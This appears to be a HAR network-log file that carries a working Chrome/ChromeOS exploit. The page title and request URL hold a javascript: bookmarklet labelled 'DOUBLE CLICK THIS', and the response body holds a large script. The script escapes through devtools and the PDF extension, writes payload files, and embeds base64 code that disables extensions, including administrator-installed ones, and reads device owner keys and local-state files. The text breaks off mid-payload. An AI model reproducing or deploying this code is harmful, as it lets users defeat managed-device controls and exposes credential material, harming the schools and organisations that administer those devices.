{
  "log": {
    "version": "1.2",
    "creator": {
      "name": "NodeJS HarGen",
      "version": "1.0"
    },
    "pages": [
      {
        "startedDateTime": "2025-05-20T18:37:08.974Z",
        "id": "page_1",
        "title": "javascript:(function(){eval(atob(\"\"))})()",
        "pageTimings": {
          "onContentLoad": 57.19,
          "onLoad": 57.77
        }
      }
    ],
    "entries": [
      {
        "_connectionId": "16771",
        "_initiator": {
          "type": "script",
          "stack": {
            "callFrames": [
              {
                "functionName": "",
                "scriptId": "9",
                "url": "",
                "lineNumber": 11,
                "columnNumber": 4
              }
            ]
          }
        },
        "_priority": "High",
        "_resourceType": "fetch",
        "cache": {},
        "connection": "443",
        "pageref": "page_1",
        "request": {
          "method": "GET",
          "url": "javascript:(function(){eval(atob(\"\"))})()//                    DOUBLE CLICK THIS",
          "httpVersion": "h3",
          "headers": [
            {
              "name": ":authority",
              "value": ""
            },
            {
              "name": ":method",
              "value": "GET"
            },
            {
              "name": ":path",
              "value": "javascript:(function(){eval(atob(\"\"))})()"
            },
            {
              "name": ":scheme",
              "value": "javascript"
            },
            {
              "name": "accept",
              "value": "*/*"
            },
            {
              "name": "user-agent",
              "value": "Mozilla/5.0"
            }
          ],
          "queryString": [],
          "cookies": [],
          "headersSize": -1,
          "bodySize": 0
        },
        "response": {
          "status": 200,
          "statusText": "",
          "httpVersion": "h3",
          "headers": [
            {
              "name": "content-type",
              "value": "application/javascript; charset=utf-8"
            }
          ],
          "cookies": [],
          "content": {
            "size": 127627,
            "mimeType": "application/javascript",
            "text": "((function () {\n  if (!opener) {\n      opener = window;\n  }\n  const w = window.opener.open(\"devtools://devtools/bundled/inspector.html\");\n  window.opener.close();\n  w.addEventListener(\"load\", async () => {\n      if (!w.DevToolsAPI) {\n          console.log(\"reloading\");\n          w.opener = null;\n          w.location.reload();\n      }\n      await sleep(500);\n      console.log(\"Got DevToolsAPI object from opened window:\", w.DevToolsAPI);\n      exploit(w);\n  });\n\n  window.w = w;\n\n\n  function exploit(w) {\n\n\n      function ui() {\n          const pdfId = \"mhjfbmdgcfjbbpaeojofohoefgiehjai\";\n          var globalUID = 0;\n          let globalMap = [];\n          function payload_swamp(w, d) {\n              const pdfId = \"mhjfbmdgcfjbbpaeojofohoefgiehjai\"; // Redefinition because we convert this function to a string\n              const mojoURL = \"chrome://resources/mojo/mojo/public/js/bindings.js\";\n              console.log('hi');\n              if (location.origin.includes(\"chrome-extension://\" + pdfId)) {\n                  w.close();\n                  chrome.tabs.getCurrent(function (info) {\n                      chrome.windows.create({\n                          setSelfAsOpener: true,\n                          url: mojoURL\n                      }, function (win) {\n                          const r = win.tabs[0].id;\n                          chrome.tabs.executeScript(r, { code: `location.href = \\\"javascript:${atob('%%CHROMEPAYLOAD%%')}\\\"` });\n\n                      })\n                  })\n\n\n                  return;\n              }\n\n              const blob_url = new Blob([\"alert(1)\"], { type: \"text/html\" });\n\n              w.webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, async function (fs) {\n                  function removeFile(file) {\n                      return new Promise(function (resolve, reject) {\n                          fs.root.getFile(file, { create: true }, function (entry) {\n                              entry.remove(resolve);\n                          })\n                      });\n                  }\n                  function writeFile(file, data) {\n                      return new Promise((resolve, reject) => {\n                          fs.root.getFile(file, { create: true }, function (entry) {\n                              entry.remove(function () {\n                                  fs.root.getFile(file, { create: true }, function (entry) {\n                                      entry.createWriter(function (writer) {\n                                          writer.write(new Blob([data]));\n                                          resolve(entry.toURL());\n                                      })\n                                  })\n                              })\n                          })\n                      })\n                  };\n                  if (d.cleanup) {\n                      console.log(\"cleaning up\");\n                      debugger;\n                      await removeFile('index.js');\n                      await removeFile('index.html');\n                      alert(\"Cleaned up successfully!\");\n                      cleanup();\n                      w.close();\n                      return;\n                  }\n                  await writeFile('index.js', atob(`b25lcnJvciA9IGFsZXJ0OwoKY29uc3QgdWlUZW1wbGF0ZSA9IGAKCmA7CgppZiAobG9jYWxTdG9yYWdlLmdldEl0ZW0oInVzZXJkZWZJZHMiKSA9PT0gbnVsbCkKICAgIGxvY2FsU3RvcmFnZS5zZXRJdGVtKCJ1c2VyZGVmSWRzIiwgSlNPTi5zdHJpbmdpZnkoW10pKTsKCkFycmF5LnByb3RvdHlwZS5yZW1vdmUgPSBmdW5jdGlvbihpdGVtKSB7CiAgICBpZiAodGhpcy5pbmRleE9mKGl0ZW0pID09PSAtMSkgdGhyb3cgbmV3IEVycm9yKCJub3QgaW4gYXJyYXkiKTsKICAgIHRoaXMuc3BsaWNlKHRoaXMuaW5kZXhPZihpdGVtKSwgMSk7Cn07CgpmdW5jdGlvbiBtYWtlVG9hc3QobXNnLCB0aW1lKSB7CiAgICBjb25zdCBwb3BvdmVyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiYXJ0aWNsZSIpOwogICAgcG9wb3Zlci5wb3BvdmVyID0gIm1hbnVhbCI7CiAgICBwb3BvdmVyLmNsYXNzTGlzdC5hZGQoInRvYXN0Iik7CiAgICBwb3BvdmVyLmNsYXNzTGlzdC5hZGQoIm5ld2VzdCIpOwogICAgcG9wb3Zlci50ZXh0Q29udGVudCA9IG1zZzsKICAgIHBvcG92ZXIuc3R5bGUudHJhbnNsYXRlID0gIi01MCUiOwoKICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQocG9wb3Zlcik7CiAgICBwb3BvdmVyLnNob3dQb3BvdmVyKCk7CgogICAgc2V0VGltZW91dCgoKSA9PiB7CiAgICAgICAgcG9wb3Zlci5oaWRlUG9wb3ZlcigpOwogICAgICAgIHNldFRpbWVvdXQoKCkgPT4gewogICAgICAgICAgICBwb3BvdmVyLnJlbW92ZSgpOwogICAgICAgIH0sIDUwMCk7CiAgICB9LCB0aW1lICogMTAwMCk7CgogICAgcG9wb3Zlci5hZGRFdmVudExpc3RlbmVyKCJ0b2dnbGUiLCAoZXZlbnQpID0+IHsKICAgICAgICBpZiAoZXZlbnQubmV3U3RhdGUgPT09ICJvcGVuIikgewogICAgICAgICAgICBtb3ZlVG9hc3RzKCk7CiAgICAgICAgfQogICAgfSk7Cn0KCmZ1bmN0aW9uIG1vdmVUb2FzdHMoKSB7CiAgICBjb25zdCB0b2FzdHMgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCIudG9hc3QiKTsKCiAgICB0b2FzdHMuZm9yRWFjaCgodG9hc3QpID0+IHsKICAgICAgICBpZiAodG9hc3QuY2xhc3NMaXN0LmNvbnRhaW5zKCJuZXdlc3QiKSkgewogICAgICAgICAgICB0b2FzdC5zdHlsZS50b3AgPSBgNXB4YDsKICAgICAgICAgICAgdG9hc3QuY2xhc3NMaXN0LnJlbW92ZSgibmV3ZXN0Iik7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgY29uc3QgcHJldlZhbHVlID0gdG9hc3Quc3R5bGUudG9wLnJlcGxhY2UoInB4IiwgIiIpOwogICAgICAgICAgICBjb25zdCBuZXdWYWx1ZSA9IHBhcnNlSW50KHByZXZWYWx1ZSkgKyB0b2FzdC5jbGllbnRIZWlnaHQgKyAxMDsKICAgICAgICAgICAgdG9hc3Quc3R5bGUudG9wID0gYCR7bmV3VmFsdWV9cHhgOwogICAgICAgIH0KICAgIH0pOwp9CgpmdW5jdGlvbiBtYWtlRGlhbG9nKHRpdGxlLCBtc2csIG9uY2FuY2VsLCBvbmNvbmZpcm0pIHsKICAgIGNvbnN0IGRpYWxvZyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpYWxvZyIpOwogICAgY29uc3QgY29uZmlybUJ0biA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImJ1dHRvbiIpOwogICAgY29uc3QgY2FuY2VsQnRuID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiYnV0dG9uIik7CiAgICBjb25zdCBoZWFkID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaDEiKTsKICAgIGNvbnN0IGJvZHkgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICAgIGNvbnN0IGZvb3QgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKCiAgICBkaWFsb2cuYXBwZW5kQ2hpbGQoaGVhZCk7CiAgICBkaWFsb2cuYXBwZW5kQ2hpbGQoYm9keSk7CiAgICBkaWFsb2cuYXBwZW5kQ2hpbGQoZm9vdCk7CiAgICBmb290LmFwcGVuZENoaWxkKGNvbmZpcm1CdG4pOwogICAgZm9vdC5hcHBlbmRDaGlsZChjYW5jZWxCdG4pOwogICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChkaWFsb2cpOwoKICAgIGhlYWQudGV4dENvbnRlbnQgPSB0aXRsZTsKCiAgICBib2R5LnN0eWxlLm92ZXJmbG93WSA9ICJzY3JvbGwiOwogICAgYm9keS5zdHlsZS5jb2xvciA9ICJyZ2IoMjIwIDIyMCAyMjApIjsKICAgIGJvZHkuc3R5bGUuZm9udFNpemUgPSAiMXJlbSI7CiAgICBib2R5LnN0eWxlLmJvcmRlclJhZGl1cyA9ICIxMHB4IjsKICAgIGJvZHkuc3R5bGUucGFkZGluZyA9ICIxMHB4IjsKICAgIGJvZHkuc3R5bGUubWFyZ2luQm90dG9tID0gIjEwcHgiOwoKICAgIGlmIChBcnJheS5pc0FycmF5KG1zZykpIHsKICAgICAgICBib2R5LnN0eWxlLmJvcmRlciA9ICJzb2xpZCAxcHggIzFkMWQxZCI7CiAgICAgICAgbXNnLmZvckVhY2goKHZhbHVlKSA9PiB7CiAgICAgICAgICAgIGxldCBpdGVtID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgicCIpOwogICAgICAgICAgICBpdGVtLnRleHRDb250ZW50ID0gdmFsdWU7CiAgICAgICAgICAgIGJvZHkuYXBwZW5kQ2hpbGQoaXRlbSk7CiAgICAgICAgfSk7CiAgICB9IGVsc2UgewogICAgICAgIGJvZHkuc3R5bGUuYm9yZGVyID0gInNvbGlkIDFweCAjMmQyZDJkIjsKICAgICAgICBib2R5LnRleHRDb250ZW50ID0gbXNnOwogICAgfQoKICAgIGZvb3Quc3R5bGUuaGVpZ2h0ID0gImZpdC1jb250ZW50IjsKICAgIGZvb3Quc3R5bGUubWFyZ2luVG9wID0gImF1dG8iOwogICAgZm9vdC5zdHlsZS5kaXNwbGF5ID0gImZsZXgiOwogICAgZm9vdC5zdHlsZS5mbGV4RGlyZWN0aW9uID0gInJvdy1yZXZlcnNlIjsKCiAgICBjb25maXJtQnRuLmNsYXNzTGlzdC5hZGQoImNvbmZpcm1CdG4iKTsKICAgIGNvbmZpcm1CdG4uYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCAoKSA9PiB7CiAgICAgICAgZGlhbG9nLmNsb3NlKCk7CiAgICAgICAgb25jb25maXJtKCk7CiAgICAgICAgc2V0VGltZW91dCgoKSA9PiBkaWFsb2cucmVtb3ZlKCksIDEwMDApOwogICAgfSk7CiAgICBjb25maXJtQnRuLnRleHRDb250ZW50ID0gIkNvbmZpcm0iOwoKICAgIGNhbmNlbEJ0bi5jbGFzc0xpc3QuYWRkKCJjYW5jZWxCdG4iKTsKICAgIGNhbmNlbEJ0bi5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsICgpID0+IHsKICAgICAgICBkaWFsb2cuY2xvc2UoKTsKICAgICAgICBvbmNhbmNlbCgpOwogICAgICAgIHNldFRpbWVvdXQoKCkgPT4gZGlhbG9nLnJlbW92ZSgpLCAxMDAwKTsKICAgIH0pOwogICAgY2FuY2VsQnRuLnRleHRDb250ZW50ID0gIkNhbmNlbCI7CgogICAgZGlhbG9nLnNob3dNb2RhbCgpOwp9Cgphc3luYyBmdW5jdGlvbiBleHRlbnNpb25FeGlzdHMoaWQpIHsKICAgIHJldHVybiBuZXcgUHJvbWlzZSgocmVzb2x2ZSkgPT4KICAgICAgICBjaHJvbWUubWFuYWdlbWVudC5nZXRBbGwoKGV4dGVuc2lvbnMpID0+CiAgICAgICAgICAgIHJlc29sdmUoZXh0ZW5zaW9ucy5zb21lKChleHQpID0+IGV4dC5pZCA9PT0gaWQpKQogICAgICAgICkKICAgICk7Cn0KCmNvbnN0IG1hbmFnZW1lbnRUZW1wbGF0ZSA9IGAKPHRpdGxlPlVudGl0bGVkIERvY3VtZW50PC90aXRsZT4KPGxpbmsgcmVsPSJpY29uIiB0eXBlPSJpbWFnZS94LWljb24iIGhyZWY9Imh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9UM00xTjRML3JpZ3Rvb2xzLXVwZGF0ZWQtdWkvcmVmcy9oZWFkcy9tYWluL2RvY3MuaWNvIj4KPGRpdiBpZD0iY2hyb21lX21hbmFnZW1lbnRfZGlzYWJsZV9leHQiPgogIDxkaXYgY2xhc3M9ImhlYWRlciI+CiAgICA8aW1nIHNyYz0iaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1QzTTFONEwvcmlndG9vbHMtdXBkYXRlZC11aS9yZWZzL2hlYWRzL21haW4vcmlndG9vbHMtYm91bmNlLmdpZiIgYWx0PSJSaWd0b29scyBMb2dvIiBjbGFzcz0ibG9nbyIgLz4KICAgIDxoMT4gY2hyb21lLm1hbmFnZW1lbnQgRGlzYWJsZSBFeHRlbnNpb25zIDwvaDE+CiAgPC9kaXY+CiAgPHAgY2xhc3M9ImRlc2NyaXB0aW9uIj5PcmlnaW5hbCByZXBvOiBodHRwczovL2dpdGh1Yi5jb20vVDNNMU40TC9yaWd0b29scy11cGRhdGVkLXVpLwogIDxwPkV4dGVuc2lvbnM8L3A+CiAgPHdoaXRlYnV0dG9ucz4KICA8YnV0dG9uIGlkPSJjdXJyZW50LWV4dGVuc2lvbiI+RGlzYWJsZSBpbmplY3RlZCBleHRlbnNpb248L2J1dHRvbj4KICA8YnV0dG9uIGlkPSJybXYtY21uLWJsdCI+UmVtb3ZlIEJsb2F0PC9idXR0b24+CiAgPGJ1dHRvbiBpZD0iZGlzYWJsZS11c2VyZGVmLWV4dHMiPkRpc2FibGUgdXNlciBkZWZpbmVkIGxpc3Qgb2YgZXh0ZW5zaW9uczwvYnV0dG9uPgogIDwvd2hpdGVidXR0b25zPgoKICA8YnIgLz48YnIgLz4KICA8dWwgY2xhc3M9ImV4dGxpc3QiPgogIDwvdWw+CgogIDxkaXYgc3R5bGU9ImhlaWdodDogNTBweCI+PC9kaXY+CjwvZGl2PgoKYDsKbGV0IHNhdmVkRXh0TGlzdCA9IFtdOwpjb25zdCBrRmlsZXMgPSBbCiAgICAiL3Zhci9saWIvZGV2aWNlc2V0dGluZ3Mvb3duZXIua2V5IiwKICAgICIvaG9tZS9jaHJvbm9zL0xvY2FsIFN0YXRlIgpdCmFzeW5jIGZ1bmN0aW9uIHJlYWRGaWxlKHBhdGgpIHsKICAgIHJldHVybiAoYXdhaXQgZmV0Y2goImZpbGU6Ly8iICsgcGF0aCkpLmFycmF5QnVmZmVyKCk7Cn0KYXN5bmMgZnVuY3Rpb24gZmluZExhc3RQb2xpY3lGaWxlKCkgewogICAgY29uc3Qga0RldmljZVBvbGljeSA9ICIvdmFyL2xpYi9kZXZpY2VzZXR0aW5ncy9wb2xpY3kuIjsKICAgIGxldCBmb3VuZFNvbWV0aGluZyA9IGZhbHNlOwogICAgbGV0IGkgPSAwOwogICAgd2hpbGUgKHRydWUpIHsKICAgICAgICB0cnkgewogICAgICAgICAgICBjb25zb2xlLmxvZygiVHJ5aW5nICIgKyBrRGV2aWNlUG9saWN5ICsgaSk7CiAgICAgICAgICAgIGF3YWl0IHJlYWRGaWxlKGtEZXZpY2VQb2xpY3kgKyBpKTsKICAgICAgICAgICAgZm91bmRTb21ldGhpbmcgPSB0cnVlOwogICAgICAgIH0gY2F0Y2ggewogICAgICAgICAgICBpZiAoZm91bmRTb21ldGhpbmcpIHsKICAgICAgICAgICAgICAgIHJldHVybiBrRGV2aWNlUG9saWN5ICsgKGkgLSAxKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBpKys7CiAgICB9Cn0KCmZ1bmN0aW9uIGRvZXNOZWVkRmlsZUFjY2VzcygpIHsKICAgIGNvbnN0IHNjID0gY2hyb21lLnJ1bnRpbWUuZ2V0TWFuaWZlc3QoKS5wZXJtaXNzaW9uczsKICAgIHJldHVybiBzYy5pbmNsdWRlcygiYWN0aXZlVGFiIikgfHwgc2MuaW5jbHVkZXMoIjxhbGxfdXJscz4iKTsKfQoKZnVuY3Rpb24gbm9ybWFsaXplU3RyaW5nUG9zaXgocGF0aCwgYWxsb3dBYm92ZVJvb3QpIHsKICAgIHZhciByZXMgPSAnJzsKICAgIHZhciBsYXN0U2VnbWVudExlbmd0aCA9IDA7CiAgICB2YXIgbGFzdFNsYXNoID0gLTE7CiAgICB2YXIgZG90cyA9IDA7CiAgICB2YXIgY29kZTsKICAgIGZvciAodmFyIGkgPSAwOyBpIDw9IHBhdGgubGVuZ3RoOyArK2kpIHsKICAgICAgICBpZiAoaSA8IHBhdGgubGVuZ3RoKQogICAgICAgICAgICBjb2RlID0gcGF0aC5jaGFyQ29kZUF0KGkpOwogICAgICAgIGVsc2UgaWYgKGNvZGUgPT09IDQ3KQogICAgICAgICAgICBicmVhazsKICAgICAgICBlbHNlCiAgICAgICAgICAgIGNvZGUgPSA0NzsKICAgICAgICBpZiAoY29kZSA9PT0gNDcpIHsKICAgICAgICAgICAgaWYgKGxhc3RTbGFzaCA9PT0gaSAtIDEgfHwgZG90cyA9PT0gMSkgewoKICAgICAgICAgICAgfSBlbHNlIGlmIChsYXN0U2xhc2ggIT09IGkgLSAxICYmIGRvdHMgPT09IDIpIHsKICAgICAgICAgICAgICAgIGlmIChyZXMubGVuZ3RoIDwgMiB8fCBsYXN0U2VnbWVudExlbmd0aCAhPT0gMiB8fCByZXMuY2hhckNvZGVBdChyZXMubGVuZ3RoIC0gMSkgIT09IDQ2IHx8IHJlcy5jaGFyQ29kZUF0KHJlcy5sZW5ndGggLSAyKSAhPT0gNDYpIHsKICAgICAgICAgICAgICAgICAgICBpZiAocmVzLmxlbmd0aCA+IDIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGxhc3RTbGFzaEluZGV4ID0gcmVzLmxhc3RJbmRleE9mKCcvJyk7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChsYXN0U2xhc2hJbmRleCAhPT0gcmVzLmxlbmd0aCAtIDEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChsYXN0U2xhc2hJbmRleCA9PT0gLTEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXMgPSAnJzsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsYXN0U2VnbWVudExlbmd0aCA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcyA9IHJlcy5zbGljZSgwLCBsYXN0U2xhc2hJbmRleCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGFzdFNlZ21lbnRMZW5ndGggPSByZXMubGVuZ3RoIC0gMSAtIHJlcy5sYXN0SW5kZXhPZignLycpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbGFzdFNsYXNoID0gaTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRvdHMgPSAwOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKHJlcy5sZW5ndGggPT09IDIgfHwgcmVzLmxlbmd0aCA9PT0gMSkgewogICAgICAgICAgICAgICAgICAgICAgICByZXMgPSAnJzsKICAgICAgICAgICAgICAgICAgICAgICAgbGFzdFNlZ21lbnRMZW5ndGggPSAwOwogICAgICAgICAgICAgICAgICAgICAgICBsYXN0U2xhc2ggPSBpOwogICAgICAgICAgICAgICAgICAgICAgICBkb3RzID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKGFsbG93QWJvdmVSb290KSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKHJlcy5sZW5ndGggPiAwKQogICAgICAgICAgICAgICAgICAgICAgICByZXMgKz0gJy8uLic7CiAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICByZXMgPSAnLi4nOwogICAgICAgICAgICAgICAgICAgIGxhc3RTZWdtZW50TGVuZ3RoID0gMjsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIGlmIChyZXMubGVuZ3RoID4gMCkKICAgICAgICAgICAgICAgICAgICByZXMgKz0gJy8nICsgcGF0aC5zbGljZShsYXN0U2xhc2ggKyAxLCBpKTsKICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICByZXMgPSBwYXRoLnNsaWNlKGxhc3RTbGFzaCArIDEsIGkpOwogICAgICAgICAgICAgICAgbGFzdFNlZ21lbnRMZW5ndGggPSBpIC0gbGFzdFNsYXNoIC0gMTsKICAgICAgICAgICAgfQogICAgICAgICAgICBsYXN0U2xhc2ggPSBpOwogICAgICAgICAgICBkb3RzID0gMDsKICAgICAgICB9IGVsc2UgaWYgKGNvZGUgPT09IDQ2ICYmIGRvdHMgIT09IC0xKSB7CiAgICAgICAgICAgICsrZG90czsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBkb3RzID0gLTE7CiAgICAgICAgfQogICAgfQogICAgcmV0dXJuIHJlczsKfQoKZnVuY3Rpb24gX2Zvcm1hdChzZXAsIHBhdGhPYmplY3QpIHsKICAgIHZhciBkaXIgPSBwYXRoT2JqZWN0LmRpciB8fCBwYXRoT2JqZWN0LnJvb3Q7CiAgICB2YXIgYmFzZSA9IHBhdGhPYmplY3QuYmFzZSB8fCAocGF0aE9iamVjdC5uYW1lIHx8ICcnKSArIChwYXRoT2JqZWN0LmV4dCB8fCAnJyk7CiAgICBpZiAoIWRpcikgewogICAgICAgIHJldHVybiBiYXNlOwogICAgfQogICAgaWYgKGRpciA9PT0gcGF0aE9iamVjdC5yb290KSB7CiAgICAgICAgcmV0dXJuIGRpciArIGJhc2U7CiAgICB9CiAgICByZXR1cm4gZGlyICsgc2VwICsgYmFzZTsKfQp2YXIgcG9zaXggPSB7CgogICAgcmVzb2x2ZTogZnVuY3Rpb24gcmVzb2x2ZSgpIHsKICAgICAgICB2YXIgcmVzb2x2ZWRQYXRoID0gJyc7CiAgICAgICAgdmFyIHJlc29sdmVkQWJzb2x1dGUgPSBmYWxzZTsKICAgICAgICB2YXIgY3dkOwogICAgICAgIGZvciAodmFyIGkgPSBhcmd1bWVudHMubGVuZ3RoIC0gMTsgaSA+PSAtMSAmJiAhcmVzb2x2ZWRBYnNvbHV0ZTsgaS0tKSB7CiAgICAgICAgICAgIHZhciBwYXRoOwogICAgICAgICAgICBpZiAoaSA+PSAwKQogICAgICAgICAgICAgICAgcGF0aCA9IGFyZ3VtZW50c1tpXTsKICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICBpZiAoY3dkID09PSB1bmRlZmluZWQpCiAgICAgICAgICAgICAgICAgICAgY3dkID0gcHJvY2Vzcy5jd2QoKTsKICAgICAgICAgICAgICAgIHBhdGggPSBjd2Q7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgYXNzZXJ0UGF0aChwYXRoKTsKCiAgICAgICAgICAgIGlmIChwYXRoLmxlbmd0aCA9PT0gMCkgewogICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmVzb2x2ZWRQYXRoID0gcGF0aCArICcvJyArIHJlc29sdmVkUGF0aDsKICAgICAgICAgICAgcmVzb2x2ZWRBYnNvbHV0ZSA9IHBhdGguY2hhckNvZGVBdCgwKSA9PT0gNDc7CiAgICAgICAgfQoKICAgICAgICByZXNvbHZlZFBhdGggPSBub3JtYWxpemVTdHJpbmdQb3NpeChyZXNvbHZlZFBhdGgsICFyZXNvbHZlZEFic29sdXRlKTsKICAgICAgICBpZiAocmVzb2x2ZWRBYnNvbHV0ZSkgewogICAgICAgICAgICBpZiAocmVzb2x2ZWRQYXRoLmxlbmd0aCA+IDApCiAgICAgICAgICAgICAgICByZXR1cm4gJy8nICsgcmVzb2x2ZWRQYXRoOwogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICByZXR1cm4gJy8nOwogICAgICAgIH0gZWxzZSBpZiAocmVzb2x2ZWRQYXRoLmxlbmd0aCA+IDApIHsKICAgICAgICAgICAgcmV0dXJuIHJlc29sdmVkUGF0aDsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICByZXR1cm4gJy4nOwogICAgICAgIH0KICAgIH0sCiAgICBub3JtYWxpemU6IGZ1bmN0aW9uIG5vcm1hbGl6ZShwYXRoKSB7CiAgICAgICAgYXNzZXJ0UGF0aChwYXRoKTsKICAgICAgICBpZiAocGF0aC5sZW5ndGggPT09IDApIHJldHVybiAnLic7CiAgICAgICAgdmFyIGlzQWJzb2x1dGUgPSBwYXRoLmNoYXJDb2RlQXQoMCkgPT09IDQ3OwogICAgICAgIHZhciB0cmFpbGluZ1NlcGFyYXRvciA9IHBhdGguY2hhckNvZGVBdChwYXRoLmxlbmd0aCAtIDEpID09PSA0NzsKCiAgICAgICAgcGF0aCA9IG5vcm1hbGl6ZVN0cmluZ1Bvc2l4KHBhdGgsICFpc0Fic29sdXRlKTsKICAgICAgICBpZiAocGF0aC5sZW5ndGggPT09IDAgJiYgIWlzQWJzb2x1dGUpIHBhdGggPSAnLic7CiAgICAgICAgaWYgKHBhdGgubGVuZ3RoID4gMCAmJiB0cmFpbGluZ1NlcGFyYXRvcikgcGF0aCArPSAnLyc7CiAgICAgICAgaWYgKGlzQWJzb2x1dGUpIHJldHVybiAnLycgKyBwYXRoOwogICAgICAgIHJldHVybiBwYXRoOwogICAgfSwKICAgIGlzQWJzb2x1dGU6IGZ1bmN0aW9uIGlzQWJzb2x1dGUocGF0aCkgewogICAgICAgIGFzc2VydFBhdGgocGF0aCk7CiAgICAgICAgcmV0dXJuIHBhdGgubGVuZ3RoID4gMCAmJiBwYXRoLmNoYXJDb2RlQXQoMCkgPT09IDQ3OwogICAgfSwKICAgIGpvaW46IGZ1bmN0aW9uIGpvaW4oKSB7CiAgICAgICAgaWYgKGFyZ3VtZW50cy5sZW5ndGggPT09IDApCiAgICAgICAgICAgIHJldHVybiAnLic7CiAgICAgICAgdmFyIGpvaW5lZDsKICAgICAgICBmb3IgKHZhciBpID0gMDsgaSA8IGFyZ3VtZW50cy5sZW5ndGg7ICsraSkgewogICAgICAgICAgICB2YXIgYXJnID0gYXJndW1lbnRzW2ldOwogICAgICAgICAgICBhc3NlcnRQYXRoKGFyZyk7CiAgICAgICAgICAgIGlmIChhcmcubGVuZ3RoID4gMCkgewogICAgICAgICAgICAgICAgaWYgKGpvaW5lZCA9PT0gdW5kZWZpbmVkKQogICAgICAgICAgICAgICAgICAgIGpvaW5lZCA9IGFyZzsKICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICBqb2luZWQgKz0gJy8nICsgYXJnOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGlmIChqb2luZWQgPT09IHVuZGVmaW5lZCkKICAgICAgICAgICAgcmV0dXJuICcuJzsKICAgICAgICByZXR1cm4gcG9zaXgubm9ybWFsaXplKGpvaW5lZCk7CiAgICB9LAogICAgcmVsYXRpdmU6IGZ1bmN0aW9uIHJlbGF0aXZlKGZyb20sIHRvKSB7CiAgICAgICAgYXNzZXJ0UGF0aChmcm9tKTsKICAgICAgICBhc3NlcnRQYXRoKHRvKTsKICAgICAgICBpZiAoZnJvbSA9PT0gdG8pIHJldHVybiAnJzsKICAgICAgICBmcm9tID0gcG9zaXgucmVzb2x2ZShmcm9tKTsKICAgICAgICB0byA9IHBvc2l4LnJlc29sdmUodG8pOwogICAgICAgIGlmIChmcm9tID09PSB0bykgcmV0dXJuICcnOwoKICAgICAgICB2YXIgZnJvbVN0YXJ0ID0gMTsKICAgICAgICBmb3IgKDsgZnJvbVN0YXJ0IDwgZnJvbS5sZW5ndGg7ICsrZnJvbVN0YXJ0KSB7CiAgICAgICAgICAgIGlmIChmcm9tLmNoYXJDb2RlQXQoZnJvbVN0YXJ0KSAhPT0gNDcpCiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICB9CiAgICAgICAgdmFyIGZyb21FbmQgPSBmcm9tLmxlbmd0aDsKICAgICAgICB2YXIgZnJvbUxlbiA9IGZyb21FbmQgLSBmcm9tU3RhcnQ7CgogICAgICAgIHZhciB0b1N0YXJ0ID0gMTsKICAgICAgICBmb3IgKDsgdG9TdGFydCA8IHRvLmxlbmd0aDsgKyt0b1N0YXJ0KSB7CiAgICAgICAgICAgIGlmICh0by5jaGFyQ29kZUF0KHRvU3RhcnQpICE9PSA0NykKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgIH0KICAgICAgICB2YXIgdG9FbmQgPSB0by5sZW5ndGg7CiAgICAgICAgdmFyIHRvTGVuID0gdG9FbmQgLSB0b1N0YXJ0OwoKICAgICAgICB2YXIgbGVuZ3RoID0gZnJvbUxlbiA8IHRvTGVuID8gZnJvbUxlbiA6IHRvTGVuOwogICAgICAgIHZhciBsYXN0Q29tbW9uU2VwID0gLTE7CiAgICAgICAgdmFyIGkgPSAwOwogICAgICAgI